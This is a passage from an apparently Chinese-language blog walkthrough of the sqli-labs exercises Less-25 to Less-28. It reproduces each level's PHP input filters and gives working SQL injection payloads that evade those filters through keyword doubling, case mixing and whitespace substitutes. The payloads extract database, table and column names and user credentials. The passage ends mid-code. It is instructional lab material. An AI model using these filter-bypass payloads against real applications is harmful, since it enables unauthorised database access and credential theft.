<td><code>id='$id'</code></td>
</tr>
</tbody>
</table></div>
<p><strong>简单源码分析</strong>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 过滤了 or 和 and 大小写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/or/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>            <span class="c1">//strip out OR (non case sensitive)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/and/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>        <span class="c1">//Strip out AND (non case sensitive)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了 /*
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\/\*]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>        <span class="c1">//strip out /*
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了 -- 和 # 注释
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[--]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>        <span class="c1">//Strip out --
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[#]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>            <span class="c1">//Strip out #
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了空格
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\s]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>        <span class="c1">//Strip out spaces
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了斜线
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\/\\\\]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>        <span class="c1">//Strip out slashes
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">return</span> <span class="nv">$id</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p>
<p>过滤注释 可以使用闭合绕过</p>
<p>过滤了空格 可以使用如下的符号来替代：</p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>%09</td>
<td>TAB 键(水平)</td>
</tr>
<tr>
<td>%0a</td>
<td>新建一行</td>
</tr>
<tr>
<td>%0c</td>
<td>新的一页</td>
</tr>
<tr>
<td>%0d</td>
<td>return 功能</td>
</tr>
<tr>
<td>%0b</td>
<td>TAB 键(垂直)</td>
</tr>
<tr>
<td>%a0</td>
<td>空格</td>
</tr>
</tbody>
</table></div>
<p><strong>由于我在windows下无法使用一些特殊的字符代替空格，此处是因为apache的解析的问题。</strong></p>
<p>直接使用报错注入</p>
<h3 id="爆库">爆库</h3>
<p>（在hackbar中输入&amp;&amp;时，需要自行URL编码为%26%26，否则会报错，而输入||不需要）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||updatexml(1,concat(&#39;</span><span class="p">:</span><span class="s1">&#39;,(select database())),1)%26%26&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/09.png"
	width="1415"
	height="849"
	srcset="/p/ojwgoapt/09_hucc4955cf61cab3043f6ff84f86ab3217_397581_480x0_resize_box_3.png 480w, /p/ojwgoapt/09_hucc4955cf61cab3043f6ff84f86ab3217_397581_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="166"
		data-flex-basis="400px"
	
></p>
<h3 id="爆表名">爆表名</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||updatexml(1,concat(&#39;</span><span class="p">:</span><span class="s1">&#39;,(select table_name from information_schema.tables where table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39; limit 0,1)),1)||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/10.png"
	width="1599"
	height="848"
	srcset="/p/ojwgoapt/10_hu6156ecd580cffbaa71e31c6a589469e6_405907_480x0_resize_box_3.png 480w, /p/ojwgoapt/10_hu6156ecd580cffbaa71e31c6a589469e6_405907_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="452px"
	
></p>
<p>but 好像不行，过滤了<code>空格</code>和<code>or</code></p>
<p>绕过</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||updatexml(1,concat(&#39;</span><span class="p">:</span><span class="s1">&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;))),1)||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/11.png"
	width="1624"
	height="840"
	srcset="/p/ojwgoapt/11_hucbbb5875353ede713e4db62701245189_404404_480x0_resize_box_3.png 480w, /p/ojwgoapt/11_hucbbb5875353ede713e4db62701245189_404404_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="464px"
	
></p>
<h3 id="爆破列名">爆破列名</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||updatexml(1,concat(&#39;</span><span class="p">:</span><span class="s1">&#39;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;%26%26table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;))),1)||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/12.png"
	width="1778"
	height="830"
	srcset="/p/ojwgoapt/12_hu66d917b328654136f3f2c033175e0569_409510_480x0_resize_box_3.png 480w, /p/ojwgoapt/12_hu66d917b328654136f3f2c033175e0569_409510_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="214"
		data-flex-basis="514px"
	
></p>
<h3 id="爆数据">爆数据</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||updatexml(1,concat(&#39;</span><span class="p">:</span><span class="s1">&#39;,(select(group_concat(username,&#39;</span><span class="p">:</span><span class="s1">&#39;,passwoorrd))from(users))),1)||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||updatexml(1,concat(&#39;</span><span class="p">:</span><span class="s1">&#39;,(select(group_concat(username,&#39;</span><span class="p">:</span><span class="s1">&#39;,passwoorrd))from(users)where(username=&#39;</span><span class="k">admin</span><span class="s1">&#39;))),1)||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/13.png"
	width="1546"
	height="826"
	srcset="/p/ojwgoapt/13_hua895715dee7f2ac66e55334d31af8088_400874_480x0_resize_box_3.png 480w, /p/ojwgoapt/13_hua895715dee7f2ac66e55334d31af8088_400874_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-25(过滤or和and)"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="449px"
	
></p>
<h2 id="less-26a">Less-26a</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=('$id')</code></td>
</tr>
</tbody>
</table></div>
<p>与 Less-26 相比，只是拼接方式改变了，<code>因为没有输出报错信息，所以不能使用报错注入了</code>，只能被迫抛弃win环境使用docker，直接上payload。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s1">&#39;)%a0union%a0select%a01,database(),3||(&#39;</span><span class="mi">1</span><span class="s1">&#39;)=(&#39;</span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s1">&#39;)%a0union%a0select%a01,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;)),3||(&#39;</span><span class="mi">1</span><span class="s1">&#39;)=(&#39;</span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s1">&#39;)%a0union%a0select%a01,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;)),3||(&#39;</span><span class="mi">1</span><span class="s1">&#39;)=(&#39;</span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s1">&#39;)%a0union%a0select%a01,(select(group_concat(username,&#39;</span><span class="p">:</span><span class="s1">&#39;,passwoorrd))from(users)),3||(&#39;</span><span class="mi">1</span><span class="s1">&#39;)=(&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-27过滤了很多">Less-27(过滤了很多)</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、报错、布尔盲注、延时盲注</td>
<td><code>id=('$id')</code></td>
</tr>
</tbody>
</table></div>
<p>查看代码，过滤规则又增加了许多：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># 过滤了 /*
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\/\*]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了 -
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[--]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了 #
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[#]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了空格
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[ +]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了 select /m 严格模式 不可以使用双写绕过
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/select/m&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/select/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/Select/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/SELECT/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 过滤了 union UNION
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/union/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/Union/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/UNION/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nv">$id</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>PHP语法</p>
</blockquote>
<blockquote>
<p>正则表达式</p>
</blockquote>
<p><a class="link" href="http://php.net/manual/zh/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers"  target="_blank" rel="noopener"
    >PHP正则表达式的模式修饰符（官方文档）</a>
<a class="link" href="http://www.php.cn/php-weizijiaocheng-354831.html"  target="_blank" rel="noopener"
    >PHP正则中的i,m,s,x,e</a></p>
<blockquote>
<ul>
<li><code>i</code>
如果设定了此修正符，模式中的字符将同时匹配大小写字母。</li>
<li><code>m</code>
如果设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</li>
<li><code>s</code>
如果设定了此修正符，模式中的圆点元字符<code>.</code>匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</li>
<li><code>x</code>
如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的<code>#</code>以及下一个换行符之间的所有字符，包括两头，也都被忽略。</li>
<li><code>e</code>
如果设定了此修正符，<code>preg_replace()</code>在替换字符串中对逆向引用作正常的替换。</li>
<li><code>?</code>
在<code>.</code>/<code>+</code>/<code>*</code>之后表示非贪婪匹配，<code>.</code>/<code>+</code>/<code>*</code>限定符都是贪婪的，它们会尽可能多的匹配文字，在它们的后面加上一个<code>?</code>就可以实现非贪婪或最小匹配。</li>
</ul>
</blockquote>
<p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 大小写混写</span>
</span></span><span class="line"><span class="cl">unioN
</span></span><span class="line"><span class="cl">unIon
</span></span><span class="line"><span class="cl">seLect
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 嵌套双写</span>
</span></span><span class="line"><span class="cl">uunionnion
</span></span><span class="line"><span class="cl">sselectelect
</span></span><span class="line"><span class="cl">ununionion
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="判断注入点">判断注入点</h3>
<p>单引号字符型，过滤掉了#,&ndash;,空格等字符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>成功闭合
<img src="/p/ojwgoapt/14.png"
	width="1407"
	height="835"
	srcset="/p/ojwgoapt/14_hu88748fea83a036874bbfdf27c4faf99f_392487_480x0_resize_box_3.png 480w, /p/ojwgoapt/14_hu88748fea83a036874bbfdf27c4faf99f_392487_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-27"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="404px"
	
></p>
<h3 id="判断数据库名">判断数据库名</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s1">&#39;%0aunIon%0aselEct%0a1,database(),3%0a||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="err">使用</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="err">代替空格，</span><span class="k">unIon</span><span class="err">、</span><span class="n">selEct</span><span class="err">随机大小写绕过，</span><span class="o">-</span><span class="err">被过滤了，使用</span><span class="mi">999</span><span class="err">让其爆出显错位</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/15.png"
	width="1365"
	height="832"
	srcset="/p/ojwgoapt/15_hu3e2255c75d790591317aa225f65dc501_392875_480x0_resize_box_3.png 480w, /p/ojwgoapt/15_hu3e2255c75d790591317aa225f65dc501_392875_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-27"
	
	
		class="gallery-image" 
		data-flex-grow="164"
		data-flex-basis="393px"
	
></p>
<h3 id="判断表名">判断表名</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s1">&#39;%0aunIon%0aselEct%0a1,(selEct(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;</span><span class="k">security</span><span class="s1">&#39;)),3%0a||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/16.png"
	width="1650"
	height="825"
	srcset="/p/ojwgoapt/16_hu01b943ee195261b7314227c72717fb54_403646_480x0_resize_box_3.png 480w, /p/ojwgoapt/16_hu01b943ee195261b7314227c72717fb54_403646_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-27"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="480px"
	
></p>
<h3 id="判断列名">判断列名</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s1">&#39;%0aunIon%0aselEct%0a1,(selEct(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;)),3%0a||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/17.png"
	width="1602"
	height="826"
	srcset="/p/ojwgoapt/17_hu868fa41b4770e7bd10f805af0d8e2707_402099_480x0_resize_box_3.png 480w, /p/ojwgoapt/17_hu868fa41b4770e7bd10f805af0d8e2707_402099_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-27"
	
	
		class="gallery-image" 
		data-flex-grow="193"
		data-flex-basis="465px"
	
></p>
<h3 id="得到数据">得到数据</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s1">&#39;%0aunIon%0aselEct%0a1,(selEct(group_concat(username,&#39;</span><span class="p">:</span><span class="s1">&#39;,password))from(users)),3%0a||&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ojwgoapt/18.png"
	width="1892"
	height="796"
	srcset="/p/ojwgoapt/18_hu2e7167a3b4f0464c1bb447b6723356f9_408755_480x0_resize_box_3.png 480w, /p/ojwgoapt/18_hu2e7167a3b4f0464c1bb447b6723356f9_408755_1024x0_resize_box_3.png 1024w"
	loading="lazy"
	
		alt="Less-27"
	
	
		class="gallery-image" 
		data-flex-grow="237"
		data-flex-basis="570px"
	
></p>
<blockquote>
<p>总结</p>
</blockquote>
<p>1 这里空格<code>%0a</code>代替</p>
<p>2这里正则表达式是只要你含有 就会一直匹配 双写不能绕过</p>
<p>3当-1不能用的时候 随便用一个错误的值把显示的位置让出来 给你要的数据</p>
<h2 id="less-27a">Less-27a</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=&quot;$id&quot;</code></td>
</tr>
</tbody>
</table></div>
<p>和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">999</span><span class="s2">&#34;%0aunIon%0aselEct%0a1,(selEct(group_concat(username,&#39;:&#39;,password))from(users)),3%0a||&#34;</span><span class="mi">1</span><span class="s2">&#34;=&#34;</span><span class="mi">1</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="less-28">Less-28</h2>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>请求方式</th>
<th>注入类型</th>
<th>拼接方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>GET</td>
<td>联合、布尔盲注、延时盲注</td>
<td><code>id=('$id')</code></td>
</tr>
</tbody>
</table></div>
<p>过滤规则如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-Php" data-lang="Php"><span class="line"><span class="cl"><span class="c1"># 过滤 /*
